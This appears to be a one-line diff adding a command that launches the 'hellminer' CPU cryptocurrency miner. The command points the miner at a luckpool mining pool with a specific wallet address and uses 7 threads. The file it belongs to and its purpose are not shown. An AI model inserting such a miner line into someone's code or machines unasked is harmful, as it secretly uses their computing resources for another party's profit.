@@ -1,0 +1,1 @@
+./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RXxoaeLLeHvRENfVTuFBpHym2LYFXkh1Nw.her -p x --cpu 7
